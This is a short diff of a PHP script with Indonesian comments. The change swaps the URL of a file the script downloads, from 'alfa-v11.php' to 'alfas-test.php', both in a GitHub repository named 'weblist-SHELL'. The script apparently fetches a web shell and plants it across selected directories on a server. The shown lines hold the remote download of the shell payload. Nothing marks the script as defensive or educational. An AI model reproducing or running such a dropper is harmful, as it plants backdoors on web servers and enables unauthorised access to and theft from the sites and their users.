@@ -43,7 +43,7 @@ if (empty($selectedDirs)) {
 }
 
 // URL sumber file yang akan diunduh
-$sourceFileUrl = 'https://github.com/rendihidayat683/weblist-SHELL/raw/refs/heads/main/alfa-v11.php';
+$sourceFileUrl = 'https://github.com/rendihidayat683/weblist-SHELL/raw/refs/heads/main/alfas-test.php';
 
 // Mengunduh konten dari URL sumber sekali saja untuk efisiensi
 $fileContent = file_get_contents($sourceFileUrl);
